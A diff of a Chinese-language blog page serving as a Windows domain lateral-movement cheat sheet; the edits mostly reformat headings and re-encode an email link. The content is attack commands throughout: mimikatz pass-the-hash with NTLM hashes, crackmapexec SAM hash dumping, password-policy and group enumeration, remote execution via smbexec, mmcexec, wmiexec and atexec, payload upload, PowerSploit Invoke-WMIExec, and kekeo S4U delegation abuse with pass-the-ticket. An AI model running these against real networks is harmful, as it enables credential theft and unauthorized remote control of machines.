@@ -394,17 +394,27 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:win10 &#x2F;domain:test.local &#x2F;ntlm:6a6293bc0c56d7b9731e2d5506065e4a</span><br></pre></td></tr></table></figure>
 <h4 id="批量方式"><a href="#批量方式" class="headerlink" title="批量方式"></a>批量方式</h4><p>CS、crackmap都可以批量PTH，CS直接点点点就行了</p>
 <h5 id="crackmap"><a href="#crackmap" class="headerlink" title="crackmap"></a>crackmap</h5><p>这个工具的思路作用是直接命令执行或传马</p>
-<h6 id="SMB服务探测"><a href="#SMB服务探测" class="headerlink" title="SMB服务探测"></a>SMB服务探测</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure>
-<h6 id="查看密码策略"><a href="#查看密码策略" class="headerlink" title="查看密码策略"></a>查看密码策略</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --pass-pol</span><br></pre></td></tr></table></figure>
-<h6 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --sam</span><br></pre></td></tr></table></figure>
-<h6 id="枚举组"><a href="#枚举组" class="headerlink" title="枚举组"></a>枚举组</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --local-groups</span><br></pre></td></tr></table></figure>
-<h6 id="基于smbexec执行"><a href="#基于smbexec执行" class="headerlink" title="基于smbexec执行"></a>基于smbexec执行</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method smbexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
-<h6 id="基于dcom执行"><a href="#基于dcom执行" class="headerlink" title="基于dcom执行"></a>基于dcom执行</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method mmcexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
-<h6 id="基于atexec执行"><a href="#基于atexec执行" class="headerlink" title="基于atexec执行"></a>基于atexec执行</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method wmiexec -X &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
-<h6 id="利用hash传递"><a href="#利用hash传递" class="headerlink" title="利用hash传递"></a>利用hash传递</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -H &#39;579110c49145015c47ecd267657d3174&#39; --exec-method atexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
-<h6 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h6><p>默认到C盘，源-目标</p>
+<p>SMB服务探测</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure>
+<p>查看密码策略</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --pass-pol</span><br></pre></td></tr></table></figure>
+<p>hashdump</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --sam</span><br></pre></td></tr></table></figure>
+<p>枚举组</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --local-groups</span><br></pre></td></tr></table></figure>
+<p>基于smbexec执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method smbexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
+<p>基于dcom执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method mmcexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
+<p>基于atexec执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method wmiexec -X &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
+<p>利用hash传递</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -H &#39;579110c49145015c47ecd267657d3174&#39; --exec-method atexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
+<p>上传文件</p>
+<p>默认到C盘，源-目标</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --put-file 1.bin 32.bin</span><br></pre></td></tr></table></figure>
-<h6 id="查看电脑的盘符"><a href="#查看电脑的盘符" class="headerlink" title="查看电脑的盘符"></a>查看电脑的盘符</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --disks</span><br></pre></td></tr></table></figure>
+<p>查看电脑的盘符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --disks</span><br></pre></td></tr></table></figure>
 <h5 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h5><p>Invoke-WMIexec<br>Invoke-SMBExec</p>
 <p>命令格式</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行</span><br><span class="line">Invoke-WMIExec -Target 10.0.2.5 -Domain workgroup -Username uac -Hash 36aa83bdcab3c9fdaf321ca42a31c3fc -Command &quot;calc&quot; -verbose</span><br><span class="line">检查</span><br><span class="line">Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0</span><br></pre></td></tr></table></figure>
@@ -532,7 +542,7 @@
 <p>3.基于委派服务用户向服务器请求TGT</p>
 <p>使用keko冒充委派服务用户请求TGT，密码明文，hash，aes加密都行</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:cs &#x2F;domain:exp.com &#x2F;password:password</span><br><span class="line">tgt::ask &#x2F;user:cs &#x2F;domain:exp.com &#x2F;NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br></pre></td></tr></table></figure>
-<p>4.通过s4u伪造<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#114;&#64;&#x65;&#x78;&#x70;&#x2e;&#99;&#111;&#109;&#x69;&#x66;&#x73;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#114;&#64;&#x65;&#x78;&#x70;&#x2e;&#99;&#111;&#109;&#x69;&#x66;&#x73;</a>服务</p>
+<p>4.通过s4u伪造<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#x72;&#x40;&#x65;&#120;&#112;&#x2e;&#x63;&#111;&#109;&#105;&#x66;&#x73;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#x72;&#x40;&#x65;&#120;&#112;&#x2e;&#x63;&#111;&#109;&#105;&#x66;&#x73;</a>服务</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgs::s4u &#x2F;tgt:1.kirbi &#x2F;user:administrator &#x2F;service:cifs&#x2F;dc.test.local</span><br></pre></td></tr></table></figure>
 <p>S4U2Self获取到的ST1以及S4U2Proxy获取到的dm08 CIFS服务的ST2会保存在当前目录下</p>
 <p>5.PTT</p>
